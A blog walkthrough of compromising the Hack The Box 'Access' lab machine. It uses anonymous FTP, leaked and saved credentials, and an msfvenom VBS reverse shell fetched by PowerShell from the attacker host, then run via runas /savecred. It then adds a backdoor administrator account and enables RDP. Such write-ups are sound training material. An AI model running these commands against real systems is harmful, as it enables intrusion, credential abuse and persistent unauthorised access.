---
id: 428
title: 'Access &#8211; HacktheBox'
date: 2018-11-22T16:49:55+01:00
author: rowbot
excerpt: 'A very fun and frustrating box - learned a lot with it. '
layout: post
guid: http://offsecnewbie.com/?p=428
permalink: /2018/11/22/access-hackthebox/
image: /wp-content/uploads/2018/11/Screenshot-from-2018-12-06-14-42-16.png
categories:
  - Hackthebox
---
**Skills Required**  
Basic knowledge of Linux  
GoogleFu  


**Skills Learned**  
Telnet  
Taking advantage of saved credentials  
  


<pre class="wp-block-preformatted">START<br /></pre>

nmap -sC -sV -oA all -vv -p- 10.10.10.98<figure class="wp-block-image">

<img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/ports.png?w=680" alt="" class="wp-image-430" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/ports.png?w=821 821w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/ports.png?resize=300%2C79 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/ports.png?resize=768%2C202 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> <figcaption>ports after full nmap scan</figcaption></figure> <figure class="wp-block-image"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/dc.png?w=680" alt="" class="wp-image-453" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/dc.png?w=670 670w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/dc.png?resize=300%2C208 300w" sizes="(max-width: 670px) 100vw, 670px" data-recalc-dims="1" /><figcaption>only thing on the index page</figcaption></figure> 

I did a dirbuster search and nikto but they both revealed nothing of use. I always check these first as they take time to run. So I can get them running and move on. Now to do a nmap FTP scan.  


<pre class="wp-block-preformatted">[<strong>root</strong>:~/htb/access/writeup]# nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.10.10.98
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-22 14:47 GMT
NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
Nmap scan report for 10.10.10.98
Host is up, received echo-reply ttl 127 (0.036s latency).

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.

Nmap done: 1 IP address (1 host up) scanned in 22.19 seconds
[<strong>root</strong>:~/htb/access/writeup]# 
</pre>

So anonymous FTP login is available! Directory listing is not possible this way for some reason. Lets check for files using FileZilla!  
<figure class="wp-block-image">

<img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/filezilla.png?w=680" alt="" class="wp-image-432" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/filezilla.png?w=549 549w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/filezilla.png?resize=150%2C150 150w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/filezilla.png?resize=300%2C300 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/filezilla.png?resize=500%2C500 500w" sizes="(max-width: 549px) 100vw, 549px" data-recalc-dims="1" /> <figcaption>Pulled backup.mdb and Access Control.zip back to kali  
  
</figcaption></figure> 

2 folders and 2 files found. Inside Engineer file &#8211; a zip file called Access Control.zip and inside backup folder &#8211; backup.mdb.  
<figure class="wp-block-image">

<img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/password-protected.png?w=680" alt="" class="wp-image-436" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/password-protected.png?w=436 436w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/password-protected.png?resize=300%2C143 300w" sizes="(max-width: 436px) 100vw, 436px" data-recalc-dims="1" /> <figcaption>I tried to open Access Control.zip but it was password protected. </figcaption></figure> 

I&#8217;m gonna assume the password is within the other file somewhere. If stuck not knowing what a file type is I always refer to Google!<figure class="wp-block-image">

<img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/whatis.png?w=680" alt="" class="wp-image-437" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/whatis.png?w=639 639w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/whatis.png?resize=300%2C146 300w" sizes="(max-width: 639px) 100vw, 639px" data-recalc-dims="1" /> <figcaption>what is .mdb file.&nbsp;</figcaption></figure> 

I searched to see if there was an easy way to view the contents of the file and found a useful site &#8211; <https://www.mdbopener.com/>  
<figure class="wp-block-image">

<img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/lots-of-tables.png?w=680" alt="" class="wp-image-439" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/lots-of-tables.png?w=1006 1006w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/lots-of-tables.png?resize=300%2C117 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/lots-of-tables.png?resize=768%2C298 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> </figure> 

I found a table called &#8220;auth user&#8221; &#8211; seems interesting. Opened it and there are 3 entries<figure class="wp-block-image">

<img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/engineer.png?w=680" alt="" class="wp-image-440" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/engineer.png?w=984 984w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/engineer.png?resize=300%2C40 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/engineer.png?resize=768%2C101 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> </figure> 

Using the engineer password I extracted the contents of Access Control.zip to give me a .pst file. Back to Google!  
<figure class="wp-block-image">

<img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/pstfile.png?w=680" alt="" class="wp-image-441" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/pstfile.png?w=611 611w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/pstfile.png?resize=300%2C179 300w" sizes="(max-width: 611px) 100vw, 611px" data-recalc-dims="1" /> <figcaption>Looks like a file Outlook would use</figcaption></figure> 

So it looks like a saved email. I don&#8217;t want to have to use Outlook to view it so I check Google once again for an easier way. <https://www.pdfen.com/convert-to-pdf/pst-to-pdf>  
<figure class="wp-block-image">

<img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/email.png?w=680" alt="" class="wp-image-444" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/email.png?w=688 688w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/email.png?resize=300%2C101 300w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> </figure> 

So there is a user account on this box called &#8216;security&#8217; with a password &#8216;4Cc3ssC0ntr0ller&#8217;. Okay so how do I login? Lets try FTP. Back to Filezilla!  


<pre class="wp-block-preformatted">Command:    USER engineer<br />Response:    331 Password required for engineer.<br />Command:    PASS **<br />Response:    530 User cannot log in.</pre>

Okay that didn&#8217;t work so I tried telnet  
<figure class="wp-block-image">

<img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/telnet.png?w=680" alt="" class="wp-image-447" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/telnet.png?w=503 503w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/telnet.png?resize=300%2C151 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/telnet.png?resize=500%2C250 500w" sizes="(max-width: 503px) 100vw, 503px" data-recalc-dims="1" /> </figure> <figure class="wp-block-image"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/addingtelnet-creds.png?w=680" alt="" class="wp-image-449" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/addingtelnet-creds.png?w=692 692w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/addingtelnet-creds.png?resize=300%2C78 300w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /><figcaption>Adding creds to Pentest.ws</figcaption></figure> 

What type and build of server am I connected to?  


<pre class="wp-block-preformatted">C:\temp\scripts&gt;systeminfo                                                                                                                                           [102/1437]<br />Host Name:                 ACCESS         <br />OS Name:                   Microsoft Windows Server 2008 R2 Standard<br />OS Version:                6.1.7600 N/A Build 7600<br />OS Manufacturer:           Microsoft Corporation<br />OS Configuration:          Standalone Server<br />OS Build Type:             Multiprocessor Free<br />Registered Owner:          Windows User   <br />Registered Organization:                  <br />Product ID:                55041-507-9857321-84191<br />Original Install Date:     8/21/2018, 9:43:10 PM<br />System Boot Time:          11/22/2018, 2:47:46 PM<br />System Manufacturer:       VMware, Inc.   <br />System Model:              VMware Virtual Platform<br />System Type:               x64-based PC   </pre>

Captured user.txt file  


<pre class="wp-block-preformatted">C:\Users\security\Desktop&gt;type user.txt<br />ff1f3b48913b213a31ff6756d2553d38<br />C:\Users\security\Desktop&gt;</pre>

So I browsed around uploaded nc.exe but could not executed it. It looks like scripts and executables are blocked.  


<pre class="wp-block-preformatted">This program is blocked by group policy. For more information, contact your system administrator.</pre>

I started to look for files/folders which are not in the standard Windows install &#8211; and found this:  


<pre class="wp-block-preformatted">C:\ZKTeco&gt;dir<br /> Volume in drive C has no label.<br /> Volume Serial Number is 9C45-DBF0<br />Directory of C:\ZKTeco<br />08/22/2018  07:23 AM    <br />          .<br />08/22/2018  07:23 AM              ..<br />08/23/2018  10:56 PM              ZKAccess3.5<br />               0 File(s)              0 bytes<br />               3 Dir(s)  16,771,903,488 bytes free<br />C:\ZKTeco&gt;</pre>

<pre class="wp-block-preformatted">[root:~/htb/access]# searchsploit ZKAccess<br /><br />Exploit Title                                                                                                                                    <br />ZKTeco ZKAccess Professional 3.5.3 - Insecure File Permissions Privilege Escalation                                                                        </pre>

To save you reading about me struggling with this part&nbsp; &#8211; it turned out to be a rabbit hole. I knew it was the wrong version but sometimes the vulnerability might be in the older version as well, so it was worth a shot

I poked about and found a scripts folder with vbs scripts&#8230; interesting &#8211; especially the readme_first.txt.  


<pre class="wp-block-preformatted">C:\temp\scripts&gt;dir<br /> Volume in drive C has no label.<br /> Volume Serial Number is 9C45-DBF0<br />Directory of C:\temp\scripts<br />08/21/2018  10:25 PM    <br />          .<br />08/21/2018  10:25 PM              ..<br />08/21/2018  10:30 PM               157 1_CREATE_SYSDBA.sql<br />08/21/2018  10:30 PM                90 2_ALTER_SERVER_ROLE.sql<br />08/21/2018  10:30 PM               300 3_SP_ATTACH_DB.sql<br />08/21/2018  10:30 PM               100 4_ALTER_AUTHORIZATION.sql<br />08/21/2018  10:30 PM             1,802 README_FIRST.txt<br />03/12/2018  01:37 PM             5,013 RestartServiceByDescriptionNameLike.vbs<br />03/12/2018  01:37 PM             1,998 SetAccessRuleOnDirectory.vbs<br />03/12/2018  01:37 PM            26,624 sqlcommand.exe<br />03/12/2018  01:37 PM             3,855 SQLOpenFirewallPorts.vbs<br />03/12/2018  01:37 PM             5,277 SQLServerCfgPort.vbs<br />              10 File(s)         45,216 bytes<br />               2 Dir(s)  16,771,903,488 bytes free</pre>

<pre class="wp-block-preformatted">README_FIRST.txt<br />"Login:" = "sa"<br />"Password:" = "htrcy@HXeryNJCTRHcnb45CJRY"</pre>

Looks like SQL db user & password  


I checked to see if any saved creds. A lazy admin would save credentials using cmdkey. It creates, lists, and deletes stored user names and passwords or credentials.<figure class="wp-block-image">

<img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/creds.png?w=680" alt="" class="wp-image-462" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/creds.png?w=774 774w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/creds.png?resize=300%2C79 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/creds.png?resize=768%2C201 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> <figcaption>always noting the creds I capture</figcaption></figure> 

So this admin seems to be quite lazy &#8211; including the password inside this file. I check to see if he has saved any credentials to the machine and bingo!  


<pre class="wp-block-preformatted">C:\temp\scripts&gt;cmdkey /list<br />Currently stored credentials:<br /><code>Target: Domain:interactive=ACCESS\Administrator                                                   Type: Domain PasswordUser: ACCESS\Administrator</code><br />C:\temp\scripts&gt;</pre>

So the Administrator password is stored! 

I wanted to upgrade to a proper shell as using Telnet is very difficult to use due to not being able to delete letters or press up on the keyboard to replay things in the buffer.

So know thing that .exes cant be run and that there are .vbs files in the scripts folder&nbsp; &#8211; maybe the user can run .vbs files?  


<pre class="wp-block-preformatted">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.234 LPORT=443 --platform windows -a x64 -f vbs -o shell.vbs</pre>

I created a .vbs file, downloaded it to the server and tried to run it but no luck &#8211; looks like .vbs files can only be run by the administrator.  


<pre class="wp-block-preformatted">powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.234/shell.vbs','C:\temp\scripts\shell.vbs')"</pre>

<pre class="wp-block-preformatted">C:\temp\scripts&gt;shell.vbs<br />Access is denied.<br />C:\temp\scripts&gt;</pre>

<pre class="wp-block-preformatted">For the vbs scripts: <br />Go to windows Services and stop ALL SQL related services.<br />Open command prompt with elevated privileges (Administrator).<br />paste the following commands in command prompt for each script and click ENTER…<br />1. cmd.exe /c WScript.exe "c:\temp\scripts\SQLOpenFirewallPorts.vbs" "C:\Windows\system32" "c:\temp\logs\"</pre>

I need to use the runas command as it has a flag /savecreds which takes advantage of the administrator saved creds on the system.  


So following the guide in the README_FIRST.txt I created this runas command with a nc listener on port 443.  


<pre class="wp-block-preformatted">runas /user:Administrator /noprofile /savecred "cmd.exe /c WScript.exe "c:\temp\scripts\shell.vbs""</pre>

<pre class="wp-block-preformatted">[root:~/htb]# nc -lnvp 443<br />listening on [any] 443 …<br />connect to [10.10.14.234] from (UNKNOWN) [10.10.10.98] 49158<br />Microsoft Windows [Version 6.1.7600]<br />Copyright (c) 2009 Microsoft Corporation.  All rights reserved.<br />C:\Windows\system32&gt;type c:\users\administrator\desktop\root.txt<br />type c:\users\administrator\desktop\root.txt<br />Access is denied.<br />C:\Windows\system32&gt;whoami<br />whoami<br />access\administrator<br />C:\Windows\system32&gt;</pre>

So I got connected but strangely I could not read the root.txt file even though I&#8217;m logged in as administrator. I always find it easier to work with remote desktop. I know its very noisy but for this final bit its worth it. 

I created a new user called test with password TotallySec123

<pre class="wp-block-preformatted">C:\Users\Administrator\Desktop&gt;net user test TotallySec123 /add<br />net user test TotallySec123 /add<br />The command completed successfully.<br />C:\Users\Administrator\Desktop&gt;net localgroup administrators test /add<br />net localgroup administrators test /add<br />The command completed successfully.</pre>

To enable remote desktop I ran the following as Administrator:`<br>`

<pre class="wp-block-preformatted">reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0<br />netsh firewall set service remoteadmin enable<br />netsh firewall set service remotedesktop enable</pre><figure class="wp-block-image">

<img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rdesktop.png?w=680" alt="" class="wp-image-464" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rdesktop.png?w=536 536w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rdesktop.png?resize=300%2C214 300w" sizes="(max-width: 536px) 100vw, 536px" data-recalc-dims="1" /> <figcaption>logged on as test with password TotallySec123</figcaption></figure> <figure class="wp-block-image"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rootfile.png?w=680" alt="" class="wp-image-465" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rootfile.png?w=747 747w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rootfile.png?resize=300%2C113 300w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /><figcaption>root.txt file is green</figcaption></figure> <figure class="wp-block-image"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/encrpyted.png?w=680" alt="" class="wp-image-467" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/encrpyted.png?w=412 412w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/encrpyted.png?resize=252%2C300 252w" sizes="(max-width: 412px) 100vw, 412px" data-recalc-dims="1" /><figcaption>the file is encrypted&nbsp;</figcaption></figure> 

It looks like the contexts can be indexed.  


I uploaded a meterpreter shell to priv esc to nt authority\system to see if could view the contents of the file but unfortunately I couldn&#8217;t.  


<pre class="wp-block-preformatted">C:\Users\Administrator\Desktop&gt;whoami<br />whoami<br />nt authority\system<br />C:\Users\Administrator\Desktop&gt;type root.txt<br />type root.txt<br />Access is denied.<br />C:\Users\Administrator\Desktop&gt;</pre>

I tried to use powershell to view the contents.  


<pre class="wp-block-preformatted">C:\Users\Administrator\Desktop&gt;powershell -nologo "& "Get-Content root.txt"<br />Get-Content : Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied.<br /></pre>

I&#8217;m really not sure whats going on here. Hopefully some one can enlighten me. I managed to get root by changing the administrator password, enabling Remote Desktop logging in, running the ZkAccess program, exiting Remote Desktop then viewing the text file as below:  


<pre class="wp-block-preformatted">C:\Users\Administrator\Desktop&gt;type root.txt<br />
type root.txt<br />
6e1586cc7ab230a8d297e8f933d904cf<br />
C:\Users\Administrator\Desktop&gt;</pre>